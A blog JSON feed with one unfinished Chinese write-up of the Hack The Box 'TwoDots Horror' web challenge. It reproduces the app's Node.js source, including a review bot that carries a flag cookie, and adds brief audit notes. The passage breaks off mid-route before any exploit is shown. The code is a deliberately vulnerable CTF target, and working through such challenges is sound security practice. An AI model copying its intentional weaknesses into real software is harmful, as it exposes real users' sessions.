{
    "version": "https://jsonfeed.org/version/1",
    "title": "ililiiY • All posts by \"web\" tag",
    "description": "承蒙的是希望 做出你想做的",
    "home_page_url": "https://lookhui.github.io",
    "items": [
        {
            "id": "https://lookhui.github.io/HTB-TwoDots-Horror/",
            "url": "https://lookhui.github.io/HTB-TwoDots-Horror/",
            "title": "HTB-TwoDots_Horror",
            "date_published": "2023-12-15T12:23:43.000Z",
            "content_html": "<h1 id=\"twodots-horror未完成\"><a class=\"anchor\" href=\"#twodots-horror未完成\">#</a> TwoDots Horror（未完成）</h1>\n<p>白盒测试</p>\n<p>这个代码是 node.js 写的我们首先查看这个 dockerfile 发现并没有 flag 信息</p>\n<p>审计一下这些 js 代码</p>\n<p>index.js</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const express       = require(&#x27;express&#x27;);</span><br><span class=\"line\">const fileUpload    = require(&#x27;express-fileupload&#x27;);</span><br><span class=\"line\">const app           = express();</span><br><span class=\"line\">const path          = require(&#x27;path&#x27;);</span><br><span class=\"line\">const bodyParser    = require(&#x27;body-parser&#x27;);</span><br><span class=\"line\">const cookieParser  = require(&#x27;cookie-parser&#x27;);</span><br><span class=\"line\">const nunjucks      = require(&#x27;nunjucks&#x27;);</span><br><span class=\"line\">const routes        = require(&#x27;./routes&#x27;);</span><br><span class=\"line\">const Database      = require(&#x27;./database&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">const db = new Database(&#x27;TwoDots-Horror.db&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">app.use(bodyParser.json());</span><br><span class=\"line\">app.use(bodyParser.urlencoded(&#123; extended: true &#125;));</span><br><span class=\"line\">app.use(cookieParser());</span><br><span class=\"line\"></span><br><span class=\"line\">app.use(fileUpload(&#123; limits: &#123;</span><br><span class=\"line\">\t\tfileSize: 2 * 1024 * 1024 // 2 MB</span><br><span class=\"line\">\t&#125;,</span><br><span class=\"line\">\tabortOnLimit: true</span><br><span class=\"line\"> &#125;));</span><br><span class=\"line\"></span><br><span class=\"line\">app.use(function(req, res, next) &#123;</span><br><span class=\"line\">\tres.setHeader(&quot;Content-Security-Policy&quot;, &quot;default-src &#x27;self&#x27;; object-src &#x27;none&#x27;; style-src &#x27;self&#x27; https://fonts.googleapis.com; font-src &#x27;self&#x27; https://fonts.gstatic.com;&quot;)</span><br><span class=\"line\">\tnext();</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">nunjucks.configure(&#x27;views&#x27;, &#123;</span><br><span class=\"line\">\tautoescape: true,</span><br><span class=\"line\">\texpress: app</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">app.set(&#x27;views&#x27;, &#x27;./views&#x27;);</span><br><span class=\"line\">app.use(&#x27;/static&#x27;, express.static(path.resolve(&#x27;static&#x27;)));</span><br><span class=\"line\"></span><br><span class=\"line\">app.use(routes(db));</span><br><span class=\"line\"></span><br><span class=\"line\">app.all(&#x27;*&#x27;, (req, res) =&gt; &#123;</span><br><span class=\"line\">\treturn res.status(404).send(&#123;</span><br><span class=\"line\">\t\tmessage: &#x27;404 page not found&#x27;</span><br><span class=\"line\">\t&#125;);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">(async () =&gt; &#123;</span><br><span class=\"line\">\tawait db.connect();</span><br><span class=\"line\">\tawait db.migrate();</span><br><span class=\"line\">\tapp.listen(1337, &#x27;0.0.0.0&#x27;, () =&gt; console.log(&#x27;Listening on port 1337&#x27;));</span><br><span class=\"line\">&#125;)();</span><br></pre></td></tr></table></figure></p>\n<p>database.js</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const sqlite = require(&#x27;sqlite-async&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">class Database &#123;</span><br><span class=\"line\">\tconstructor(db_file) &#123;</span><br><span class=\"line\">\t\tthis.db_file = db_file;</span><br><span class=\"line\">\t\tthis.db = undefined;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tasync connect() &#123;</span><br><span class=\"line\">\t\tthis.db = await sqlite.open(this.db_file);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tasync migrate() &#123;</span><br><span class=\"line\">\t\treturn this.db.exec(`</span><br><span class=\"line\">            DROP TABLE IF EXISTS users;</span><br><span class=\"line\"></span><br><span class=\"line\">            CREATE TABLE IF NOT EXISTS users (</span><br><span class=\"line\">                id         INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,</span><br><span class=\"line\">                username   VARCHAR(255) NOT NULL UNIQUE,</span><br><span class=\"line\">                password   VARCHAR(255) NOT NULL,</span><br><span class=\"line\">                avatar     VARCHAR(255) NOT NULL</span><br><span class=\"line\">            );</span><br><span class=\"line\"></span><br><span class=\"line\">            DROP TABLE IF EXISTS posts;</span><br><span class=\"line\"></span><br><span class=\"line\">            CREATE TABLE IF NOT EXISTS posts (</span><br><span class=\"line\">                id         INTEGER      NOT NULL PRIMARY KEY AUTOINCREMENT,</span><br><span class=\"line\">                author  VARCHAR(255) NOT NULL,</span><br><span class=\"line\">                content    VARCHAR(255) NOT NULL,</span><br><span class=\"line\">                approved   INTEGER      NOT NULL,</span><br><span class=\"line\">                created_at TIMESTAMP    DEFAULT CURRENT_TIMESTAMP</span><br><span class=\"line\">            );</span><br><span class=\"line\"></span><br><span class=\"line\">            INSERT INTO posts (author, approved, content) VALUES (&#x27;ColonelAengus&#x27;, 1, &#x27;Our baby girl is finally crawling for the first time. I just wish it wasn’t on the ceiling.&#x27;);</span><br><span class=\"line\">            INSERT INTO posts (author, approved, content) VALUES (&#x27;windowsXP&#x27;, 1, &#x27;Keyboard not responding. Press any key to continue.&#x27;);</span><br><span class=\"line\">            INSERT INTO posts (author, approved, content) VALUES (&#x27;unkn0wn&#x27;, 1, &#x27;There was a picture in my phone of me sleeping. I live alone.&#x27;);</span><br><span class=\"line\">            INSERT INTO posts (author, approved, content) VALUES (&#x27;Scry67&#x27;, 1, &#x27;The last man on Earth sat alone in a room. There was a knock at the door.&#x27;);</span><br><span class=\"line\">            INSERT INTO posts (author, approved, content) VALUES (&#x27;fluffyponyza&#x27;, 1, &#x27;Day 312. Internet still not working.&#x27;);</span><br><span class=\"line\">        `);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tasync registerUser(user, pass) &#123;</span><br><span class=\"line\">\t\treturn new Promise(async (resolve, reject) =&gt; &#123;</span><br><span class=\"line\">\t\t\ttry &#123;</span><br><span class=\"line\">\t\t\t\tlet stmt = await this.db.prepare(&#x27;INSERT INTO users (username, password, avatar) VALUES ( ?, ?, &quot;default.jpg&quot;)&#x27;);</span><br><span class=\"line\">\t\t\t\tresolve((await stmt.run(user, pass)));</span><br><span class=\"line\">\t\t\t&#125; catch(e) &#123;</span><br><span class=\"line\">\t\t\t\treject(e);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tasync loginUser(user, pass) &#123;</span><br><span class=\"line\">\t\treturn new Promise(async (resolve, reject) =&gt; &#123;</span><br><span class=\"line\">\t\t\ttry &#123;</span><br><span class=\"line\">\t\t\t\tlet stmt = await this.db.prepare(&#x27;SELECT username FROM users WHERE username = ? and password = ?&#x27;);</span><br><span class=\"line\">\t\t\t\tresolve(await stmt.get(user, pass));</span><br><span class=\"line\">\t\t\t&#125; catch(e) &#123;</span><br><span class=\"line\">\t\t\t\treject(e);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tasync getUser(user) &#123;</span><br><span class=\"line\">\t\treturn new Promise(async (resolve, reject) =&gt; &#123;</span><br><span class=\"line\">\t\t\ttry &#123;</span><br><span class=\"line\">\t\t\t\tlet stmt = await this.db.prepare(&#x27;SELECT * FROM users WHERE username = ?&#x27;);</span><br><span class=\"line\">\t\t\t\tresolve(await stmt.get(user));</span><br><span class=\"line\">\t\t\t&#125; catch(e) &#123;</span><br><span class=\"line\">\t\t\t\treject(e);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tasync checkUser(user) &#123;</span><br><span class=\"line\">\t\treturn new Promise(async (resolve, reject) =&gt; &#123;</span><br><span class=\"line\">\t\t\ttry &#123;</span><br><span class=\"line\">\t\t\t\tlet stmt = await this.db.prepare(&#x27;SELECT username FROM users WHERE username = ?&#x27;);</span><br><span class=\"line\">\t\t\t\tlet row = await stmt.get(user);</span><br><span class=\"line\">\t\t\t\tresolve(row !== undefined);</span><br><span class=\"line\">\t\t\t&#125; catch(e) &#123;</span><br><span class=\"line\">\t\t\t\treject(e);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tasync updateAvatar(user, avatar) &#123;</span><br><span class=\"line\">\t\treturn new Promise(async (resolve, reject) =&gt; &#123;</span><br><span class=\"line\">\t\t\ttry &#123;</span><br><span class=\"line\">\t\t\t\tlet stmt = await this.db.prepare(&#x27;UPDATE users SET avatar = ? WHERE username = ?&#x27;);</span><br><span class=\"line\">\t\t\t\tresolve(await stmt.run(avatar, user));</span><br><span class=\"line\">\t\t\t&#125; catch(e) &#123;</span><br><span class=\"line\">\t\t\t\treject(e);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tasync addPost(author, content) &#123;</span><br><span class=\"line\">\t\treturn new Promise(async (resolve, reject) =&gt; &#123;</span><br><span class=\"line\">\t\t\ttry &#123;</span><br><span class=\"line\">\t\t\t\tlet stmt = await this.db.prepare(&#x27;INSERT INTO posts (author, content, approved) VALUES (? , ?, 0)&#x27;);</span><br><span class=\"line\">\t\t\t\tresolve(await stmt.run(author, content));</span><br><span class=\"line\">\t\t\t&#125; catch(e) &#123;</span><br><span class=\"line\">\t\t\t\treject(e);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tasync getPosts(approved=1) &#123;</span><br><span class=\"line\">\t\treturn new Promise(async (resolve, reject) =&gt; &#123;</span><br><span class=\"line\">\t\t\ttry &#123;</span><br><span class=\"line\">\t\t\t\tlet stmt = await this.db.prepare(&#x27;SELECT * FROM posts WHERE approved = ?&#x27;);</span><br><span class=\"line\">\t\t\t\tresolve(await stmt.all(approved));</span><br><span class=\"line\">\t\t\t&#125; catch(e) &#123;</span><br><span class=\"line\">\t\t\t\treject(e);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">module.exports = Database;</span><br></pre></td></tr></table></figure></p>\n<p>这个数据库语法使用了预处理无法造成常规 sql 注入</p>\n<p>bot.js</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const puppeteer = require(&#x27;puppeteer&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">const browser_options = &#123;</span><br><span class=\"line\">\theadless: true,</span><br><span class=\"line\">\targs: [</span><br><span class=\"line\">\t\t&#x27;--no-sandbox&#x27;,</span><br><span class=\"line\">\t\t&#x27;--disable-background-networking&#x27;,</span><br><span class=\"line\">\t\t&#x27;--disable-default-apps&#x27;,</span><br><span class=\"line\">\t\t&#x27;--disable-extensions&#x27;,</span><br><span class=\"line\">\t\t&#x27;--disable-gpu&#x27;,</span><br><span class=\"line\">\t\t&#x27;--disable-sync&#x27;,</span><br><span class=\"line\">\t\t&#x27;--disable-translate&#x27;,</span><br><span class=\"line\">\t\t&#x27;--hide-scrollbars&#x27;,</span><br><span class=\"line\">\t\t&#x27;--metrics-recording-only&#x27;,</span><br><span class=\"line\">\t\t&#x27;--mute-audio&#x27;,</span><br><span class=\"line\">\t\t&#x27;--no-first-run&#x27;,</span><br><span class=\"line\">\t\t&#x27;--safebrowsing-disable-auto-update&#x27;</span><br><span class=\"line\">\t]</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">const cookies = [&#123;</span><br><span class=\"line\">    &#x27;name&#x27;: &#x27;flag&#x27;,</span><br><span class=\"line\">    &#x27;value&#x27;: &#x27;HTB&#123;f4k3_fl4g_f0r_t3st1ng&#125;&#x27;</span><br><span class=\"line\">&#125;];</span><br><span class=\"line\"></span><br><span class=\"line\">async function purgeData(db)&#123;</span><br><span class=\"line\">\tconst browser = await puppeteer.launch(browser_options);</span><br><span class=\"line\">\tconst page = await browser.newPage();</span><br><span class=\"line\"></span><br><span class=\"line\">\tawait page.goto(&#x27;http://127.0.0.1:1337/&#x27;);</span><br><span class=\"line\">\tawait page.setCookie(...cookies);</span><br><span class=\"line\"></span><br><span class=\"line\">\tawait page.goto(&#x27;http://127.0.0.1:1337/review&#x27;, &#123;</span><br><span class=\"line\">\t\twaitUntil: &#x27;networkidle2&#x27;</span><br><span class=\"line\">\t&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">\tawait browser.close();</span><br><span class=\"line\">\tawait db.migrate();</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">module.exports = &#123; purgeData &#125;;</span><br></pre></td></tr></table></figure></p>\n<p>这里存在了 flag 放进了 cookies</p>\n<p>routes/index.js</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const fs             = require(&#x27;fs&#x27;);</span><br><span class=\"line\">const bot            = require(&#x27;../bot&#x27;);</span><br><span class=\"line\">const path           = require(&#x27;path&#x27;);</span><br><span class=\"line\">const express        = require(&#x27;express&#x27;);</span><br><span class=\"line\">const router         = express.Router();</span><br><span class=\"line\">const JWTHelper      = require(&#x27;../helpers/JWTHelper&#x27;);</span><br><span class=\"line\">const UploadHelper   = require(&#x27;../helpers/UploadHelper&#x27;)</span><br><span class=\"line\">const AuthMiddleware = require(&#x27;../middleware/AuthMiddleware&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">let db;</span><br><span class=\"line\"></span><br><span class=\"line\">const response = data =&gt; (&#123; message: data &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">router.get(&#x27;/&#x27;, (req, res) =&gt; &#123;</span><br><span class=\"line\">\treturn res.render(&#x27;index.html&#x27;);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">router.post(&#x27;/api/register&#x27;, async (req, res) =&gt; &#123;</span><br><span class=\"line\">\tconst &#123; username, password &#125; = req.body;</span><br><span class=\"line\"></span><br><span class=\"line\">\tif (username &amp;&amp; password) &#123;</span><br><span class=\"line\">\t\treturn db.checkUser(username)</span><br><span class=\"line\">\t\t\t.then(user =&gt; &#123;</span><br><span class=\"line\">\t\t\t\tif (user) return res.status(401).send(response(&#x27;User already registered!&#x27;));</span><br><span class=\"line\">\t\t\t\treturn db.registerUser(username, password)</span><br><span class=\"line\">\t\t\t\t\t.then(()  =&gt; res.send(response(&#x27;User registered successfully!&#x27;)))</span><br><span class=\"line\">\t\t\t&#125;)</span><br><span class=\"line\">\t\t\t.catch(() =&gt; res.send(response(&#x27;Something went wrong!&#x27;)));</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn res.status(401).send(response(&#x27;Please fill out all the required fields!&#x27;));</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">router.post(&#x27;/api/login&#x27;, async (req, res) =&gt; &#123;</span><br><span class=\"line\">\tconst &#123; username, password &#125; = req.body;</span><br><span class=\"line\"></span><br><span class=\"line\">\tif (username &amp;&amp; password) &#123;</span><br><span class=\"line\">\t\treturn db.loginUser(username, password)</span><br><span class=\"line\">\t\t\t.then(user =&gt; &#123;</span><br><span class=\"line\">\t\t\t\tlet token = JWTHelper.sign(&#123; username: user.username &#125;);</span><br><span class=\"line\">\t\t\t\tres.cookie(&#x27;session&#x27;, token, &#123; maxAge: 3600000 &#125;);</span><br><span class=\"line\">\t\t\t\treturn res.send(response(&#x27;User authenticated successfully!&#x27;));</span><br><span class=\"line\">\t\t\t&#125;)</span><br><span class=\"line\">\t\t\t.catch(() =&gt; res.status(403).send(response(&#x27;Invalid username or password!&#x27;)));</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn res.status(500).send(response(&#x27;Missing parameters!&#x27;));</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">router.get(&#x27;/feed&#x27;, AuthMiddleware, async (req, res, next) =&gt; &#123;</span><br><span class=\"line\">\treturn db.getUser(req.data.username)</span><br><span class=\"line\">\t\t.then(user =&gt; &#123;</span><br><span class=\"line\">\t\t\tif(user === undefined) return res.redirect(&#x27;/&#x27;);</span><br><span class=\"line\">\t\t\treturn db.getPosts()</span><br><span class=\"line\">\t\t\t\t.then(feed =&gt; &#123;</span><br><span class=\"line\">\t\t\t\t\tres.render(&#x27;feed.html&#x27;, &#123; feed &#125;);</span><br><span class=\"line\">\t\t\t\t&#125;)</span><br><span class=\"line\">\t\t&#125;)</span><br><span class=\"line\">\t\t.catch(() =&gt; res.status(500).send(response(&#x27;Something went wrong!&#x27;)));</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">router.get(&#x27;/profile&#x27;, AuthMiddleware, async (req, res, next) =&gt; &#123;</span><br><span class=\"line\">\treturn db.getUser(req.data.username)</span><br><span class=\"line\">\t\t.then(user =&gt; &#123;</span><br><span class=\"line\">\t\t\tif(user === undefined) return res.redirect(&#x27;/&#x27;);</span><br><span class=\"line\">\t\t\tres.render(&#x27;profile.html&#x27;, &#123; user &#125;);</span><br><span class=\"line\">\t\t&#125;)</span><br><span class=\"line\">\t\t.catch(() =&gt; res.status(500).send(response(&#x27;Something went wrong!&#x27;)));</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">router.get(&#x27;/review&#x27;, async (req, res, next) =&gt; &#123;</span><br><span class=\"line\">\tif(req.ip != &#x27;127.0.0.1&#x27;) return res.redirect(&#x27;/&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn db.getPosts(0)</span><br><span class=\"line\">\t\t.then(feed =&gt; &#123;</span><br><span class=\"line\">\t\t\tres.render(&#x27;review.html&#x27;, &#123; feed &#125;);</span><br><span class=\"line\">\t\t&#125;)</span><br><span class=\"line\">\t\t.catch(() =&gt; res.status(500).send(response(&#x27;Something went wrong!&#x27;)));</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">router.post(&#x27;/api/submit&#x27;, AuthMiddleware, async (req, res) =&gt; &#123;</span><br><span class=\"line\">\treturn db.getUser(req.data.username)</span><br><span class=\"line\">\t\t.then(user =&gt; &#123;</span><br><span class=\"line\">\t\t\tif (user === undefined) return res.redirect(&#x27;/&#x27;); </span><br><span class=\"line\">\t\t\tconst &#123; content &#125; = req.body;</span><br><span class=\"line\">\t\t\tif(content)&#123;</span><br><span class=\"line\">\t\t\t\ttwoDots = content.match(/\\./g);</span><br><span class=\"line\">\t\t\t\tif(twoDots == null || twoDots.length != 2)&#123;</span><br><span class=\"line\">\t\t\t\t\treturn res.status(403).send(response(&#x27;Your story must contain two sentences! We call it TwoDots Horror!&#x27;));</span><br><span 